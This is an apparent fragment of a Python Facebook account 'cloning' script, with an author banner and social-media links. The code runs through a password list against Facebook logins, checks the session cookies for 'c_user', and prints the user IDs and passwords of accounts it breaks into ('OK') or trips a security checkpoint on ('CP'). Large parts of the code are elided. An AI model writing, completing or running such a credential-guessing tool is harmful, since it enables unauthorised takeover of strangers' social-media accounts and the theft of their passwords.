...
'''
this is an open source program by AHSAM (JOIYA-SAAB)
...
\033[1;33m |/     \||/   \__/  |/     \|(_______)|/     \|  
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧. AHSAM                    %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/MR-AUH404  %s║"%(Z,B,Z))
	print("%s║%s  FACEBOOK: AHSAM UL HAQ     %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [AHSAM-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [AHSAM-CP] '+uidx+' | '+pasw+'\033[0;97m')
